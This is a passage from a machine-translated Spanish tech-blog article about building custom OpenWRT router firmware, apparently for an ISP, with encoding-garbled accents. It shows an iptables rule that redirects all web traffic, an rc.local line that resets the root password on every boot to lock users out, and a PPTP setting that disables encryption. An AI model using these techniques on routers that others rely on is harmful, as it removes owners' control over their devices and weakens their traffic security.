<pre><code class="bash hljs">iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to ip:port
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En general, podemos dirigir completamente el tr√°fico. </font><font style="vertical-align: inherit;">Tambi√©n puede instalar paquetes en un sistema de archivos ftp montado, para esto usamos </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">opkg ‚Äìdest</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , despu√©s de especificar el nombre y la direcci√≥n de nuestro sistema de archivos en </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/opkg.conf</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">El resto de la configuraci√≥n tambi√©n debe registrarse previamente en los archivos apropiados.</font></font><br>
<pre><code class="bash hljs">/etc/firewall.user<font></font>
/etc/config/firewall<font></font>
/etc/config/network<font></font>
/etc/config/system<font></font>
/etc/config/wireless<font></font>
/etc/rc.local<font></font>
 .<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Todos estos archivos deben estar preparados de antemano para incrustarlos en el firmware. </font><font style="vertical-align: inherit;">En realidad, ¬øqu√© nos aporta esto adem√°s de las caracter√≠sticas adicionales? </font><font style="vertical-align: inherit;">Pero el hecho es que el sistema de archivos squashfs es de solo lectura. </font><font style="vertical-align: inherit;">En consecuencia, el usuario no podr√° cambiar la configuraci√≥n predeterminada que configur√© de ninguna manera. </font><font style="vertical-align: inherit;">Con toda su voluntad, incluso a trav√©s de telnet, no podr√° conectarse, </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">porque</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> en </font><i><font style="vertical-align: inherit;">rc.local</font></i><font style="vertical-align: inherit;"> , que est√° cosido en el firmware, hay una l√≠nea</font></font><br>
<pre><code class="bash hljs"><span class="hljs-built_in">echo</span> ‚Äìe ‚Äúpass\npass‚Äù | passwd root
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Es decir, el acceso a trav√©s de Telnet se corta inmediatamente despu√©s de cargar el enrutador, y solo yo tengo la contrase√±a SSH. </font><font style="vertical-align: inherit;">Restablecer los valores predeterminados con un bot√≥n f√≠sico tambi√©n fallar√° aqu√≠, porque el valor predeterminado lo configuro yo y lo cose en el firmware. </font><font style="vertical-align: inherit;">El objetivo se logra.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En relaci√≥n con la transferencia de todos los usuarios a IPoE en los √∫ltimos tiempos y el abandono de VPN, todos estaban detr√°s de NAT, incluidos los enrutadores en los que ten√≠a una VPN para acceder a la red interna del proveedor. Adem√°s de aquellos que han activado el servicio de "IP est√°tica", por supuesto. Pero hay un problema: aquellos que desean una IP real a√∫n deben usar una VPN para acceder a Internet. Tuve que atormentarme y construir OpenWRT con un cliente PPTP cableado y configurado (y funciona por alguna raz√≥n realmente torcida), as√≠ como un servidor OpenVPN cableado y configurado. Muchos enrutadores murieron durante los experimentos, pero el resultado finalmente se logr√≥. Despu√©s de haber vertido dicho firmware en varios enrutadores (de los pocos restantes con IP real), tengo acceso estable a la red interna utilizando OpenVPN.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
El problema con la conexi√≥n de PPTP VPN fue que los servidores del proveedor no admiten cifrado. </font><font style="vertical-align: inherit;">Esto se solucion√≥ agregando una l√≠nea a </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/ppp/options.pptp</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<pre><code class="bash hljs">nomppe
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
De lo contrario, el proceso de configuraci√≥n del cliente VPN PPTP y el servidor OpenVPN no fue diferente de los manuales de OpenWRT. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Espero que este art√≠culo sea interesante para alguien y alguien aprenda algo nuevo de √©l. </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UPD:</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Como </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ValdikSS</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> escribi√≥ en los comentarios </font><font style="vertical-align: inherit;">, en lugar de curlftpfs + tinyproxy, puede usar OpenSSH, que es m√°s funcional.</font></font></div>
      
    </div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es381573/">https://habr.com/ru/post/es381573/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es381559/index.html">Ultrabook anti-crisis: barato y alegre</a></li>
<li><a href="../es381563/index.html">C√≥mo la innovaci√≥n tecnol√≥gica cambiar√° la vida cotidiana</a></li>
<li><a href="../es381565/index.html">Medidor de energ√≠a o c√≥mo medir la eficiencia de la salida</a></li>
<li><a href="../es381567/index.html">Twitter ha eliminado anuncios que podr√≠an provocar una crisis epil√©ptica</a></li>
<li><a href="../es381569/index.html">Instrucciones de ensamblaje de la impresora 3D 3D Prism Uni (Parte 2-Electricista)</a></li>
<li><a href="../es381575/index.html">El hombre subi√≥ al escenario de Broadway para cargar su tel√©fono inteligente. "¬øLa luna llena o el idiota?"</a></li>
<li><a href="../es381577/index.html">Robots de trabajo</a></li>
<li><a href="../es381581/index.html">Los diez mejores servidores y actualizaciones de 2015</a></li>
<li><a href="../es381583/index.html">Un pedazo de masa</a></li>
<li><a href="../es381585/index.html">El autom√≥vil Honda estableci√≥ un r√©cord mundial en consumo de combustible: 2.4 litros por cada 100 km</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>